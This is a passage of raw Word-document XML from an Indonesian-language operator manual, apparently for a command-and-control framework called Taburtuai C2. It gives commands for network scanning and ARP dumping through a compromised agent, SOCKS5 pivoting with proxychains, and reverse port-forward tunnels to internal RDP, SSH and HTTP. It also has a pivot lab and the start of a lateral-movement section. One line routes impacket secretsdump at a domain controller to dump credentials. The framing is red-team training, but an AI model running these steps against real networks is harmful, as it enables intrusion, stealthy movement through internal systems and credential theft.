        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>netscan &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --targets 192.168.1.0/24 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --ports 22,80,443,445,3389,5985 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --scan-timeout 2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Scan host spesifik dengan port penuh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>netscan &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --targets 192.168.1.100 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --ports 1-65535 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --workers 500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Scan dengan banner grabbing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>netscan &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --targets 192.168.1.0/24 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --ports 22,80,21 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --banners \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>ARP Scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dump ARP table (host aktif tanpa probe baru)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>arpscan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Lebih stealth dari port scan — hanya baca tabel yang sudah ada</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>SOCKS5 Proxy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>SOCKS5 proxy membuka listener di mesin agent sehingga operator bisa route semua tool (nmap, impacket, browser) melalui agent ke network internal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Start SOCKS5 di agent (default 127.0.0.1:1080)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>socks5 start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SOCKS5 dengan address custom</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>socks5 start &lt;agent-id&gt; --addr 0.0.0.0:9050 --wait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Cek status</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>socks5 status &lt;agent-id&gt;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Konfigurasi proxychains (di mesin operator)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># echo "socks5 127.0.0.1 1080" &gt;&gt; /etc/proxychains4.conf</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Gunakan dengan tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># proxychains nmap -sT -p 80,443 192.168.1.100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># proxychains python3 impacket/secretsdump.py CORP/admin@DC01</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Stop</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>socks5 stop &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Port Forwarding (Reverse Tunnel)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Port forwarding membuka TCP listener di server C2 dan me-relay koneksi ke target di network internal melalui agent. Cocok untuk mengakses satu service spesifik.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Buat tunnel RDP ke host internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>portfwd start &lt;agent-id&gt; 192.168.1.10:3389 --local-port 33899</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Lihat session aktif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>portfwd list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Setelah agent eksekusi (1 beacon interval):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Konek RDP ke localhost:33899</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>xfreerdp /v:localhost:33899 /u:CORP\john /p:'P@ss'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Atau Windows:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># mstsc /v:localhost:33899</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Tunnel SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>portfwd start &lt;agent-id&gt; 192.168.1.10:22 --local-port 2222</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># ssh -p 2222 admin@localhost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Tunnel HTTP internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>portfwd start &lt;agent-id&gt; 192.168.1.100:80 --local-port 8888</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># curl http://localhost:8888/</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Stop session</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>portfwd stop fwd-1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 14.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Network Discovery &amp; SOCKS5 Pivot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Scan jaringan internal dari posisi agent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>netscan &lt;agent-id&gt; --targets 192.168.0.0/24 --ports 22,445,3389,5985 --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 2:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Dump ARP table untuk melihat host aktif.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>arpscan &lt;agent-id&gt;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Start SOCKS5 proxy di agent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>socks5 start &lt;agent-id&gt;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Konfigurasi proxychains di mesin operator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf</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Akses host internal melalui proxy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>proxychains curl http://192.168.0.100/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 6:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Stop SOCKS5 saat selesai.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>socks5 stop &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 15 — LATERAL MOVEMENT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Lateral movement adalah proses berpindah dari satu host ke host lain di jaringan internal. Taburtuai C2 mendukung lima teknik lateral movement, semuanya menggunakan built-in Windows tools — tidak perlu binary tambahan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Perbandingan Teknik</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2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Teknik</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Output</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Noise</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Prereq</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DCOM (mmc20/shellwindows)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
